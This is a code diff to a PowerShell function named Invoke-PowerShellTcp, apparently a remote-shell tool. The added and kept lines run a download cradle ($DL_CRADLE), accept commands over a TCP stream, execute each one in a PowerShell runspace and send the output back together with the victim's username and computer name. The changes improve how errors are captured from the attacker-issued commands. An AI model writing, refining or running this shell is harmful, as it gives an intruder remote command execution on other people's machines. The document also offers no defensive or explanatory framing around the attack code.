@@ -41,18 +41,33 @@ function Invoke-PowerShellTcp
         $client = $listener.AcceptTcpClient()
     }
 
+    function Error_DataAdded {
+        Param(
+            [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
+            [Object]$Sender,
+            [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
+            [System.Management.Automation.DataAddedEventArgs]$e
+        )
+        write-error $e
+    }
+
     $stream = $client.GetStream()
     [byte[]]$bytes = 0..255|%{0}
 
     #Create PowerShell object
     $PowerShell = [powershell]::Create()
-    # $DL_CRADLE -split ';' | % {
-    #     write-host $_
-    #     [void]$PowerShell.AddScript($_)
-    #     $init = ( $PowerShell.Invoke() | Out-String )
-    # }
+    # $Object = New-Object 'System.Management.Automation.PSDataCollection[psobject]'
+    $outputStream = New-Object -Typename  System.Management.Automation.PSDataCollection[PSObject]
+
+    # $outputStream = $PowerShell.Streams.Error
+    $outputStream.DataAdded += { Error_DataAdded }
+
     [void]$PowerShell.AddScript($DL_CRADLE)
+
+    #Specfiy the required flags to pull the output stream
     $init = ( $PowerShell.Invoke() | Out-String )
+    # https://stackoverflow.com/questions/27254198/why-cant-i-write-error-from-powershell-streams-error-add-dataadded
+    # https://stackoverflow.com/questions/54107825/how-to-pass-warning-and-verbose-streams-from-a-remote-command-when-calling-power
 
     #Send back current username and computername
     $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`n`n" + $init)
@@ -69,7 +84,6 @@ function Invoke-PowerShellTcp
         $data = $EncodedText.GetString($bytes,0, $i)
 
         #Execute the command on the target.
-        # $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
         [void]$PowerShell.AddScript($data)
         $sendback = ( $PowerShell.Invoke() | Out-String )
 
